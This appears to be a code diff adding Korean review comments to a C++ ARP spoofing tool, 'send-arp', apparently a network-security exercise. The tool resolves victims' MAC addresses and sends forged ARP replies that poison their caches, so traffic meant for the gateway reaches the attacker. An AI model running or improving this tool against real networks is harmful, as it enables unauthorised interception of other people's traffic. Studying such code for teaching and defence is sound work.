@@ -1,3 +1,5 @@
+// spoofing 전 victim의 arp table를 resolving 중복 수행을 어떻게 최적화 하여 해결 할것인지?
+
 #include "pch.h"     // POSIX 표준 함수 제공
 #include "ethhdr.h"     // Ethernet 헤더 구조체 정의
 #include "arphdr.h"     // ARP 헤더 구조체 정의
@@ -10,14 +12,17 @@ struct EthArpPacket final {
 };
 #pragma pack(pop) // 제어부 해제
 
+//전역변수
 struct ifreq interface_req;           // 네트워크 인터페이스 정보를 저장하기 위한 구조체
-uint8_t* attacker_mac;      // 공격자의 MAC 주소를 저장할 포인터
+uint8_t* attacker_mac;      // 공격자의 MAC 주소를 저장할 포인터 6byte
 char* attacker_ip;          // 공격자의 IP 주소를 저장할 포인터
+// 해당 전역변수는 들어오는 반환값에 따라 예쁘게 자료구조 정리 필요 + 전역이 아닌 다른 방식으로 예쁘게 처리해보기.
 
 struct ArpPair {
-    uint32_t sender_ip;
-    uint32_t target_ip;
-    uint8_t sender_mac[Mac::SIZE];
+    uint32_t sender_ip;     // ARP 감염 대상이 되는 피해자의 IP 주소
+    uint32_t target_ip;     // 게이트웨이의 IP 주소 (피해자가 접근하고자 하는 목적지)
+    uint8_t sender_mac[Mac::SIZE]; // 피해자의 MAC 주소를 저장할 배열
+    //target_mac 과 같은 모든 정보들을 가져와야 한다. -> Spoofing을 위해
 };
 
 // 공격자의 MAC 주소를 가져오는 함수
@@ -26,7 +31,7 @@ void getAttackerMac(char* dev) {
     interface_req.ifr_addr.sa_family = AF_INET;           // IPv4 주소 체계 설정
     strncpy(interface_req.ifr_name, dev, IFNAMSIZ - 1);   // 인터페이스 이름 설정
     ioctl(sock_d, SIOCGIFHWADDR, &interface_req);         // MAC 주소 가져오기
-    attacker_mac = (uint8_t *)interface_req.ifr_hwaddr.sa_data; // MAC 주소 저장
+    attacker_mac = (uint8_t *)interface_req.ifr_hwaddr.sa_data; // MAC 주소 저장 전역변수 말고 다른방향으로 만들어보기.
 }
 
 // 공격자의 IP 주소를 가져오는 함수
@@ -34,7 +39,7 @@ void getAttackerIP(char* dev) {
     int sock_d = socket(AF_INET, SOCK_DGRAM, 0); // 소켓 생성
     strncpy(interface_req.ifr_name, dev, IFNAMSIZ - 1);    // 인터페이스 이름 설정
     ioctl(sock_d, SIOCGIFADDR, &interface_req);           // IP 주소 가져오기
-    attacker_ip = inet_ntoa(((struct sockaddr_in*)&interface_req.ifr_addr)->sin_addr); // IP 주소 문자열로 변환
+    attacker_ip = inet_ntoa(((struct sockaddr_in*)&interface_req.ifr_addr)->sin_addr); // IP 주소 문자열로 변환 -> 4byte -> 전역변수 말고 다른방향으로 만들어보기.
 }
 
 // ARP 요청 패킷을 생성 및 전송하는 함수
@@ -65,7 +70,7 @@ void sendArpRequest(char* dev, pcap_t* handle, uint32_t sender_ip) {
 }
 // ARP 감염 패킷 전송 함수
 void sendArpInfectingReply(char* dev, pcap_t* handle, uint32_t victim_ip, 
-                          const uint8_t* victim_mac, uint32_t gateway_ip) {
+                          const uint8_t* victim_mac, uint32_t gateway_ip) { //dev 인자 필요없다. 체크해야함
     EthArpPacket packet; // Ethernet + ARP 패킷 구조체 생성
     
     packet.eth_.dmac_ = Mac(victim_mac); // 수신자 MAC 주소 설정
@@ -90,6 +95,8 @@ void sendArpInfectingReply(char* dev, pcap_t* handle, uint32_t victim_ip,
 
 int main(int argc, char* argv[]) {
     // 인자 수 확인: 최소 4개 이상, 짝수 개의 IP 쌍 필요
+    // 인자 개수가 4개 미만이거나 (인터페이스 + sender IP + target IP 최소 필요)
+    // 또는 (전체 인자 개수 - 인터페이스 인자) % 2가 0이 아닌 경우 (sender IP와 target IP는 쌍으로 입력되어야 함)
     if (argc < 4 || (argc - 2) % 2 != 0) {
         printf("syntax: send-arp <interface> <sender ip1> <target ip1> [<sender ip2> <target ip2> ...]\n");
         printf("sample: send-arp wlan0 192.168.0.2 192.168.0.1 192.168.0.3 192.168.0.1\n");
@@ -117,7 +124,9 @@ int main(int argc, char* argv[]) {
         arp_pair.sender_ip = inet_addr(argv[2 + i * 2]); // 송신자 IP 주소 설정
         arp_pair.target_ip = inet_addr(argv[3 + i * 2]); // 타겟 IP 주소 설정
 
-        sendArpRequest(dev, handle, arp_pair.sender_ip); // ARP 요청 전송
+        //threading 필요
+        //senderip만 공격하게끔 로직이 짜여있다. << 굿
+        sendArpRequest(dev, handle, arp_pair.sender_ip); // ARP 요청 전송 phone savemode isnt work -> trying 3times , dev 필요없다 이거 체크해라
 
         while(true) { // 응답 패킷 수신 대기
             struct pcap_pkthdr* header; // 패킷 헤더
@@ -134,9 +143,9 @@ int main(int argc, char* argv[]) {
             if (recv_reply_packet->arp_.op_ != htons(ArpHdr::Reply)) continue; // 응답 패킷이 아니면 무시
             if (recv_reply_packet->arp_.sip_ != Ip(arp_pair.sender_ip)) continue; // 송신자 IP가 일치하지 않으면 무시
 
-            const uint8_t* mac_bytes = reinterpret_cast<const uint8_t*>(&recv_reply_packet->eth_.smac_); // 송신자 MAC 주소 추출
+            const uint8_t* mac_bytes = reinterpret_cast<const uint8_t*>(&recv_reply_packet->arp_.smac_); // 송신자 MAC 주소 추출
             memcpy(arp_pair.sender_mac, mac_bytes, Mac::SIZE); // MAC 주소 복사
-            arp_pairs.push_back(arp_pair); // ARP 페어를 벡터에 추가
+            arp_pairs.push_back(arp_pair); // ARP 페어를 벡터에 추가 -> resolving 된 데이터를 실제로 push 
             break; // 응답을 받았으므로 루프 종료
         }
     }
